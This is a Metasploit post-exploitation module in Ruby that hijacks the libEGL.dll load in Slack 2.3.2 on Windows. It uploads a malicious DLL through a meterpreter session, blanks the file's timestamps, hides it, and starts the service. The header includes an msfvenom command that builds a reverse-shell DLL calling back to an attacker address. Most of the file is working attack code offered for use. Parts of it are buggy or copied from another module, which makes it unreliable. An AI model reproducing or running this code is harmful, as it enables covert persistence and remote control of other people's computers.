##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : slack_dll_hijack.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# slack Version  : 2.3.2
# vuln Discover  : Chaitanya Haritash
# Tested on      : Windows 7 ultimate (32 bites)
# Software Link  : http://www.techspot.com/downloads/6754-slack.html
#
#
# [ DESCRIPTION ]
# deploy_service_payload.rb uploads your payload.exe to target system (DEPLOY_PATH)
# and creates a service pointing to it (SERVICE_NAME). The service will auto-start
# with windows with Local/System privileges. Rebooting the system or restarting the
# service will run the malicious executable with elevated privileges.
# "WARNING: This module will not delete the payload deployed"
#
# [ BUILD MALICIOUS DLL ]
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f dll -o libEGL.dll
#
#
#
# [ MODULE DEFAULT OPTIONS ]
# The session number to run this module on        => set SESSION 3
# The full path (local) of payload to be uploaded => set LOCAL_PATH /root/libEGL.dll
# Revert libEGL.dll to is default stage?           => set REVERT_HIJACK true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/manage/slack_dll_hijack.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/manage/slack_dll_hijack.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/manage
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/manage/slack_dll_hijack
# msf post(slack_dll_hijack) > info
# msf post(slack_dll_hijack) > show options
# msf post(slack_dll_hijack) > show advanced options
# msf post(slack_dll_hijack) > set [option(s)]
# msf post(slack_dll_hijack) > exploit
#




# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = GreatRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'dll hijacking in slack 2.3.2 software',
                        'Description'   => %q{
                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our libEGL.dll "WARNING: payload to send must be named as: libEGL.dll"
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'module author : pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln discover : Chaitanya Haritash', # vuln discover
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'dez 1 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',
                        'Targets'        =>
                                [
                                         # tested on: windows 7 ultimate (32 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 ultimate (32 bits)
                        'References'     =>
                                [
                                         [ 'URL', 'https://www.exploit-db.com/exploits/40577/' ],



                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('LOCAL_PATH', [ false, 'The full path of libEGL.dll to upload (eg /root/libEGL.dll)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('REVERT_HIJACK', [ false, 'revert lbEGL.dll to default?' , false])
                        ], self.class)
 
        end



# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   session = client
     sys = session.sys.config.sysinfo
       print_warning("[ABORT]: Operative System => #{sys['OS']}")
       print_error("Only windows systems are supported by this module...")
       print_error("Please execute [info] for further information...")
       print_line("")
   raise Rex::Script::Completed
end




# --------------------------------------------
# UPLOAD OUR MALICIOUS DLL INTO TARGET SYSYTEM
# --------------------------------------------
def ls_stage1

  r=''
  session = client
  p_name = "libEGL.dll" # malicious libEGL.dll
  s_name = "slack.exe" # service executable
  u_path = datastore['LOCAL_PATH']   # /root/libEGL.dll
  d_path = "%localappdata%\\slack\\app-2.3.2" # remote path on target system
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['LOCAL_PATH'].blank?
    print_error("Options not configurated correctly...")
    print_warning("Please set LOCAL_PATH option!")
    return nil
  else
    print_status("Deploying malicious dll into target system!")
    sleep(1.5)
  end


    # check if original libEGL.dll exist in target
    if client.fs.file.exist?("#{d_path}\\#{p_name}")
      print_warning(" Vulnerable dll agent: #{p_name} found!")
      # backup original dll
      r = session.sys.process.execute("cmd.exe /c COPY /Y #{p_name} libEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
      sleep(1.0)

      # upload our malicious libEGL.dll into target system..
      print_good(" Uploading: #{p_name} malicious agent...")
      client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")
      sleep(1.0)
      print_good(" Uploaded: #{u_path} -> #{d_path}\\#{p_name}")
      sleep(1.0)

        # Change remote malicious libEGL.dll timestamp (date:time)
        print_good(" Blanking malicious dll agent timestamp...")
        client.priv.fs.blank_file_mace("#{d_path}\\#{p_name}")
        sleep(1.5)

      # change attributes of libEGL.dll to hidde it from site...
      r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
      print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
      sleep(1.0)

          # start remote malicious service
          print_status("Sart remote slack service!")
          r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
          sleep(1.5)

        # task completed successefully...
        print_status("Malicious dll placed successefuly...")
        print_status("Sart one handler and wait for connection!")
        print_line("")

      # close channel when done
      r.channel.close
      r.close

    else
      print_error("ABORT: post-module cant find backdoor agent path...")
      print_error("BACKDOOR_AGENT: #{d_path}\\#{p_name}")
      print_line("")
    end

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end






# --------------------------------------
# REVERT MALICIOUS DLL TO ORIGINAL STATE
# --------------------------------------
def ls_stage2
 print_error("under develop")
end



# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client
    # Check for proper target Platform
    unsupported if client.platform !~ /win32|win64/i

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    |        slack v2.3.2 - DLL hijacking          |")
    print_line("    |      Author: r00t-3xp10it - Chaitanya        |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    # check for proper session.
    if not sysinfo.nil?
      print_status("Running module against: #{sys_nfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end

 
# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['LOCAL_PATH']
         ls_stage1
      end

      if datastore['REVERT_HIJACK']
         ls_stage2
      end
   end
end
